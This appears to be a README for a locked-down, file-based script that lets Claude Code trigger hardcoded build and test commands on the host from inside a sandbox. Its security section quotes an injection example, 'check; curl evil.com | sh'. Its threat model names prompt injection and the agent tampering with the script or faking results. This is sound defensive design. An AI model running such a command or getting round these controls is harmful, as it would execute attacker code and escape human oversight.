# Build Agent: Host-Side Sandboxed RPC for Claude Code

When Claude Code runs in a sandbox where compilation/test toolchains are broken or unavailable, this pattern lets it trigger builds on the host machine through a locked-down file-based protocol.

## The Problem

Claude Code sandboxes may have broken compilers (SIGBUS/SIGSEGV), missing system libraries, or restricted network access. The agent can read/write files fine but can't compile or run tests.

## The Solution

A minimal shell script runs on the host, watching a file for commands. Claude writes a command name, the script runs the corresponding hardcoded build/test invocation, and writes the output back.

## How It Works

```
Claude (sandbox)                    build_agent.sh (host)
     |                                    |
     |-- writes "check" to command -->    |
     |                                    |-- runs `cargo check`
     |                                    |-- writes output to result
     |                                    |-- writes "done" to status
     |<-- reads result ---------------    |
```

Files:
- `.build_agent/command` — Claude writes a command name here (single word)
- `.build_agent/result` — stdout+stderr of the executed command
- `.build_agent/status` — `idle`, `running`, or `done`

## Security Design

1. **Fixed command enum, not a shell.** Commands are single keywords (`check`, `build`, `test`, etc.) mapped to hardcoded invocations in a `case` statement. No arguments, no interpolation, no `eval`.

2. **Input sanitized.** Only lowercase `a-z` and `-` pass through. Any injection attempt like `check; curl evil.com | sh` becomes `checkcurlevilcomsh` and is rejected as unknown.

3. **No filesystem or shell utilities exposed.** Only build/test commands. Claude can run `ls`, `cat`, `grep`, etc. locally in the sandbox.

4. **Script is read-only, owned by root.** After finalizing, the script is `chmod 444` and `chown root:wheel`, so neither Claude nor the user's normal account can modify it without `sudo`.

## Setup

### 1. Create the script

Write `build_agent.sh` in your project directory. The script should contain:
- A `case` statement mapping command names to exact invocations
- Input sanitization: `tr -d '[:space:]' | tr -cd 'a-z-'`
- A polling loop watching the command file
- No `eval`, no argument passing, no shell expansion

### 2. Lock it down

```bash
# Make read-only for everyone
chmod 444 build_agent.sh

# Transfer ownership to root (requires sudo + your password)
sudo chown root:wheel build_agent.sh   # macOS
sudo chown root:root build_agent.sh    # Linux
```

After this:
- Claude cannot modify or delete the script
- Your normal user account cannot modify it either
- Only `sudo` (requiring your password) can change permissions

### 3. Run it

```bash
bash build_agent.sh
```

(No execute bit needed — `bash` reads it directly.)

### 4. To modify later

```bash
sudo chmod 644 build_agent.sh   # unlock
# make your changes
sudo chmod 444 build_agent.sh   # lock again
```

## Adding Commands

To add a new command, unlock the script, add a case to `run_command()`:

```bash
new-command)
    exact-binary --exact-flags 2>&1
    ;;
```

Rules:
- Always hardcode the full invocation — never accept arguments from the command file
- Always redirect stderr to stdout (`2>&1`)
- Never use `eval`, backticks, or `$(...)`
- Lock the script again when done

## Threat Model

| Attack | Mitigation |
|--------|-----------|
| Prompt injection makes Claude write malicious command | Only `a-z` and `-` pass through; commands are a fixed enum |
| Claude modifies the script itself | Script is `root:wheel 444` — Claude has no write access |
| `npm run` executes attacker-controlled script from package.json | `npm run` is not in the allowed commands; only `npx tauri dev/build` with hardcoded args |
| Shell metacharacters (`;`, `|`, `$()`, backticks) | Input sanitized to `a-z-` only; no `eval` used anywhere |
| Claude writes to `.build_agent/` to fake results | Not a security risk — Claude can only fool itself |
| `cargo test` runs malicious test binary | Acceptable risk — tests run your own code. If your repo is compromised, you have bigger problems |
